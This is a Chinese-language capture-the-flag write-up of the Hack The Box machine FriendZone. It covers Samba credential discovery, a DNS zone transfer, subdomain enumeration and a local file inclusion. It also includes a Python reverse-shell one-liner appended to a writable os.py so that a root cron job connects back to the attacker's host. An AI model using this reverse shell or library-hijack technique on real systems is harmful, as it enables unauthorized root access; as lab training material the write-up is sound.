---
title: FriendZone Writeup
date: 2020-12-02 04:40:10
category: Hack The Box
---

# FriendZone Writeup

![](./0.png)

## 0x00 TODO

`LinEnum.sh` 脚本补一个 `查询全局可写脚本文件`，对于个别提权场景有用。

## 0x01 信息收集

![](./1.png)

## 0x02 枚举
我去啊，这些个端口的服务查了一遍下来没有公开漏洞。

samba 匿名登录，找到一个 creds.txt - admin 密码。

![](./3.png)

![](./4.png)


目前收集了一个看似 admin 的密码，没有找到其他有效的突破口，观察 nmap 扫描结果发现 `80` 和 `443` 似乎有不同页面，可能是通过解析域名来做的。
根据主页的信息，得到一个域名 `friendzoneportal.red`，本质本地解析，打开了一个新页面。

![](./5.png)
继续添加 `friendzone.red` 解析，发现另一个页面。

![](./6.png)
![](./7.png)
可能还有更多的子域名，用 `dig` 从靶机地址反查域名。
``` bash
dig axfr @10.10.10.123 friendzone.red
dig axfr @10.10.10.123 friendzoneportal.red
```
![](./8.png)

处理一下结果获得缓存域，全部加入本地解析。
``` bash
cat fzt | grep IN | awk '{print $1}' | sed 's/\.$//g' | sort -u > hosts # awk 默认按 tab/space 分割，cut 默认按 tab 
$ vi hosts
admin.friendzoneportal.red 
administrator1.friendzone.red 
files.friendzoneportal.red 
friendzoneportal.red
friendzone.red
hr.friendzone.red
imports.friendzoneportal.red 
uploads.friendzone.red
vpn.friendzoneportal.red 
:%s/\n/ /g
```
![](./9.png)
新的突破口出现。

本地文件包含。

## 0x03 立足点

![](./12.png)

## 0x04 提权

### 1、SUID
suid exim4 4.90.1 不行。

![](./12.1.png)
![](./12.2.png)
### 2、Sudo
friend - sudo su（/home/friend/.sudo_as_admin_successful）不行。

![](./14.png)
### 3、Crontab
pspy 监控定时任务，发现执行了一个 `python` 脚本。

![](./13.png)
但是查看权限发现不可写，再查看下内容，主要代码逻辑是注释掉的。

![](./15.png)
脚本里 `import os`。**脚本不可写，导入的库却不一定**，`locate os.py` 定位库文件，查看一下权限，是可写的。

![](./16.png)
向 `/usr/lib/python2.7/os.py` 追加 python 反弹 shell 代码。
``` bash
echo 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",4445));dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> /usr/lib/python2.7/os.py
```
![](./17.png)
本地开启监听 `nc -lnvp 4445`，等待定时任务启动，获得 root shell。

![](./18.png)

## 0x05 攻击节点

## 0x06 学到什么 
